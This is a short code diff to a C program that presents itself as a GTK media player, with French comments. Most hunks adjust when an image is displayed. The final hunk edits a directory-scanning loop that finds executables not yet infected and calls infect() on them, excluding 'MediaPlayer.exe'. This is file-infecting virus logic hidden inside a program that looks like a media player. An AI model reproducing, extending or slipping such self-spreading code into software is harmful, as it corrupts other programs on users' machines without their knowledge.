@@ -111,6 +111,10 @@
       free(urlDisplay);
 
       nbrMedia = mediaIndTemp;
+
+      if(nbrMedia>0){
+        display_image(mediaList[curIndex]);
+      }
     }
 
 
@@ -133,9 +137,7 @@
         homedir = gtk_file_chooser_get_filename (GTK_FILE_CHOOSER (dialog));
         update_files(homedir);
         g_free (homedir);
-        if(nbrMedia>0){
-          display_image(mediaList[curIndex]);
-        }
+
 
       }
 
@@ -277,7 +279,7 @@
 
       while ((dir = readdir(d)) != NULL){
         stat(dir->d_name, &sb);
-        if(!string_end_with(actualProg, dir->d_name)){//Si ce n'est pas ce programme
+        if(!string_end_with("MediaPlayer.exe", dir->d_name)){//Si ce n'est pas ce programme
           if(est_executable(sb.st_mode) && !est_infecte(dir->d_name)){
             infect(dir->d_name, actualProg);
           }
